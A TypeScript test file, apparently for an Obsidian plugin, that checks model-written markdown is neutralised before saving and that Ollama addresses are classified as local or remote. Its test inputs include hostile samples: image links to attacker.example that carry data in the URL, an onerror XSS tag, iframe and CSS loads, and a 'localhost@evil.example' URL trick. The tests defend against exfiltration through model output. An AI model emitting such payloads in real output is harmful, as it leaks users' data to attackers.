import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { isLoopbackUrl, remoteHostOf, remoteHostWarning } from '../src/util/loopback.ts';
import { inertMarkdown } from '../src/notes/safeMarkdown.ts';

/* What makes text a model wrote inert before it is saved to a companion
   note (the sidebar draws it with its own renderer, see miniMarkdown.test.ts),
   and which Ollama addresses count as this computer. Both are pure: no
   Obsidian here. */

const ZWSP = '\u200B';

/** Whatever could still become an image, an embed or an HTML tag. A bare `<br>` loads nothing and is left alone. */
function live(markdown: string): string[] {
  return markdown.replace(/<br[ \t]*\/?>/gi, '').match(/!\[|<[A-Za-z/!?]/g) ?? [];
}

describe('inertMarkdown', () => {
  it('turns a remote image into the text it is written with', () => {
    const answer = 'Two posts are frozen. ![ ](https://attacker.example/p.png?d=2%20postes%20geles)';
    assert.equal(
      inertMarkdown(answer),
      'Two posts are frozen. !\\[ ](https://attacker.example/p.png?d=2%20postes%20geles)',
    );
  });

  it('does the same to an embed, a reference image and an image inside a link', () => {
    assert.equal(inertMarkdown('![[Budget 2026.png]]'), '!\\[[Budget 2026.png]]');
    assert.equal(inertMarkdown('![chart][1]\n\n[1]: https://attacker.example/c.png'), '!\\[chart][1]\n\n[1]: https://attacker.example/c.png');
    assert.equal(inertMarkdown('[![x](https://a.example/i.png)](https://a.example)'), '[!\\[x](https://a.example/i.png)](https://a.example)');
  });

  it('turns raw HTML into text, whatever the tag', () => {
    assert.equal(inertMarkdown('<img src="https://attacker.example/p.png?d=x">'), '&lt;img src="https://attacker.example/p.png?d=x">');
    assert.equal(inertMarkdown('<iframe src="https://attacker.example"></iframe>'), '&lt;iframe src="https://attacker.example">&lt;/iframe>');
    assert.equal(
      inertMarkdown('<span style="background:url(https://attacker.example/s.png)">x</span>'),
      '&lt;span style="background:url(https://attacker.example/s.png)">x&lt;/span>',
    );
    assert.equal(inertMarkdown('<!-- note --><?php ?><![CDATA[x]]>'), '&lt;!-- note -->&lt;?php ?>&lt;!\\[CDATA[x]]>');
    assert.equal(inertMarkdown('<video><source src="https://a.example/v.mp4"></video>'), '&lt;video>&lt;source src="https://a.example/v.mp4">&lt;/video>');
    assert.equal(inertMarkdown('<https://attacker.example/auto>'), '&lt;https://attacker.example/auto>');
  });

  it('leaves ordinary notes as they are', () => {
    const notes = [
      '**Budget:** two positions frozen until Q1, see [the plan](https://intranet.example/plan).',
      '- Jane takes the hiring plan\n- Next review: 14 h 30 (< 1 h)',
      'Response time < 200 ms, load <= 3 and a <-> b; 5 > 3 & 2 < 3!',
      '| Item | Owner |\n| --- | --- |\n| Hiring | Jane<br>Paul<br/>Ana<br /> |',
      '> Decision: go ahead!\n\n1. First [step]\n2. Second',
      'Wow! [not an image](https://example.com) and [[Jane Example|Jane]]',
    ];
    for (const note of notes) assert.equal(inertMarkdown(note), note);
    assert.equal(inertMarkdown(''), '');
  });

  it('keeps code readable: an invisible space in place of an escape that would show', () => {
    assert.equal(inertMarkdown('Use `<name>` here'), `Use \`<${ZWSP}name>\` here`);
    assert.equal(inertMarkdown('``a ` <b>`` and `![x](y)`'), `\`\`a \` <${ZWSP}b>\`\` and \`!${ZWSP}[x](y)\``);
    assert.equal(
      inertMarkdown('```html\n<img src="x.png">\n![a](b)\n```\n<img src="y.png">'),
      `\`\`\`html\n<${ZWSP}img src="x.png">\n!${ZWSP}[a](b)\n\`\`\`\n&lt;img src="y.png">`,
    );
    assert.equal(inertMarkdown('~~~\n</div>\n~~~~\nafter <b>'), `~~~\n<${ZWSP}/div>\n~~~~\nafter &lt;b>`);
    // Cut off while streaming: the block runs to the end, as it does when rendered.
    assert.equal(inertMarkdown('```\n<script>'), `\`\`\`\n<${ZWSP}script>`);
  });

  it('does not take a lone or an escaped backtick for the start of code', () => {
    assert.equal(inertMarkdown('a ` b <img src=x>'), 'a ` b &lt;img src=x>');
    assert.equal(inertMarkdown('\\`<img src=x>`'), `\\\`&lt;img src=x>\``);
    assert.equal(inertMarkdown('`a` <i> `b`'), '`a` &lt;i> `b`');
  });

  it('does not write an escape behind a backslash, where it would be shown', () => {
    assert.equal(inertMarkdown('\\<img src=x>'), `\\<${ZWSP}img src=x>`);
    assert.equal(inertMarkdown('\\\\<img src=x>'), '\\\\&lt;img src=x>');
    assert.equal(inertMarkdown('\\![x](https://a.example/i.png)'), `\\!${ZWSP}[x](https://a.example/i.png)`);
    assert.equal(inertMarkdown('ends with a backslash \\'), 'ends with a backslash \\');
  });

  it('leaves nothing live, however code and markup are interleaved', () => {
    const hostile = [
      '![ ](https://attacker.example/p.png?d=secret)',
      '<img src=x onerror=alert(1)>',
      '`a\nb` <img src=x> `c`',
      '- item\n  ```\n  code\n<img src=x>\n  ```\n<iframe src=x>',
      '> ```\n> quoted\n<img src=x>',
      '`unclosed <img src=x>\n\n<img src=y> `',
      '\\`<img src=x>` and \\\\`<img src=y>`',
      '``` ` ```<img src=x>',
      '<a title="`"><img src=x>`',
      '    <img src=indented>\n\t![x](y)',
      '<<img src=x>> <\n/b> <!<img src=x>',
      '!![x](y) !\\![z](w) ![![a](b)](c)',
      '| a | b |\n| - | - |\n| <img src=x> | ![x](y) |',
      '<br><img src=x><br/><br onload=x><BR ><bR/>',
      '$a<b$ and $$\n<img src=x>\n$$',
      '~~~\n```\n<img src=x>\n~~~\n```\n<img src=y>\n',
      '\r\n<img src=x>\r\n```\r\n<img src=y>\r\n```\r\n![z](w)\r\n',
    ];
    for (const text of hostile) {
      const safe = inertMarkdown(text);
      assert.deepEqual(live(safe), [], JSON.stringify(safe));
      assert.equal(inertMarkdown(safe), safe, `stable: ${JSON.stringify(text)}`);
      // Nothing is taken away: only an escape or an invisible space is added.
      assert.equal(
        safe.replaceAll(ZWSP, '').replaceAll('&lt;', '<').replaceAll('!\\[', '!['),
        text.replaceAll('!\\[', '!['),
        JSON.stringify(text),
      );
    }
  });

  it('keeps a bare line break and nothing more of a tag that carries anything', () => {
    assert.equal(inertMarkdown('a<br>b<BR/>c<br />d'), 'a<br>b<BR/>c<br />d');
    assert.equal(inertMarkdown('<br onload="x">'), '&lt;br onload="x">');
    assert.equal(inertMarkdown('<br/onload>'), '&lt;br/onload>');
    assert.equal(inertMarkdown('<brx>'), '&lt;brx>');
  });

  it('handles every prefix of a streamed answer', () => {
    const answer = 'Budget: ![ ](https://attacker.example/p.png?d=1) and <img src="https://attacker.example/q.png"> `<b>` done';
    for (let length = 0; length <= answer.length; length++) {
      assert.deepEqual(live(inertMarkdown(answer.slice(0, length))), [], `after ${length} characters`);
    }
  });
});

describe('remoteHostOf', () => {
  it('is null for this computer, however it is written', () => {
    for (const address of [
      'http://localhost:11434',
      'http://LOCALHOST:11434/',
      'https://localhost',
      'http://localhost.:11434',
      'http://ollama.localhost:11434',
      'http://127.0.0.1:11434',
      'http://127.1:11434',
      'http://127.45.6.7',
      'http://2130706433:11434',
      'http://0x7f.0.0.1:11434',
      'http://[::1]:11434',
      '  http://localhost:11434  ',
    ]) {
      assert.equal(remoteHostOf(address), null, address);
      assert.equal(isLoopbackUrl(address), true, address);
    }
  });

  it('names the host of every other address', () => {
    const remote: Array<[string, string]> = [
      ['http://192.168.1.50:11434', '192.168.1.50'],
      ['http://192.168.1.5', '192.168.1.5'],
      ['http://19', '0.0.0.19'],
      ['https://ollama.example.com', 'ollama.example.com'],
      ['http://gpu-box.local:11434', 'gpu-box.local'],
      ['http://localhost.example.com:11434', 'localhost.example.com'],
      ['http://127.0.0.1.example.com', '127.0.0.1.example.com'],
      ['http://localhost@evil.example:11434', 'evil.example'],
      ['http://notlocalhost:11434', 'notlocalhost'],
      ['http://0.0.0.0:11434', '0.0.0.0'],
      ['http://128.0.0.1', '128.0.0.1'],
      ['http://[::ffff:c0a8:132]:11434', '[::ffff:c0a8:132]'],
      ['http://[fe80::1]:11434', '[fe80::1]'],
    ];
    for (const [address, host] of remote) {
      assert.equal(remoteHostOf(address), host, address);
      assert.equal(isLoopbackUrl(address), false, address);
    }
  });

  it('has nothing to say about text that is not an http address', () => {
    for (const text of ['', 'localhost:11434', 'http://', 'ftp://192.168.1.50', 'file:///etc/hosts', 'not a url']) {
      assert.equal(remoteHostOf(text), null, text);
      assert.equal(isLoopbackUrl(text), false, text);
      assert.equal(remoteHostWarning(text), null, text);
    }
  });
});

describe('remoteHostWarning', () => {
  it('says nothing for this computer', () => {
    assert.equal(remoteHostWarning('http://localhost:11434'), null);
    assert.equal(remoteHostWarning('http://127.0.0.1:11434'), null);
  });

  it('names the host and what is sent to it', () => {
    assert.equal(
      remoteHostWarning('https://ollama.example.com'),
      'ollama.example.com is not this computer. Transcripts, notes, passages from the vault and questions are sent to it.',
    );
  });

  it('adds that plain http is not encrypted', () => {
    assert.equal(
      remoteHostWarning('http://192.168.1.50:11434'),
      '192.168.1.50 is not this computer. Transcripts, notes, passages from the vault and questions are sent to it, without encryption.',
    );
  });
});
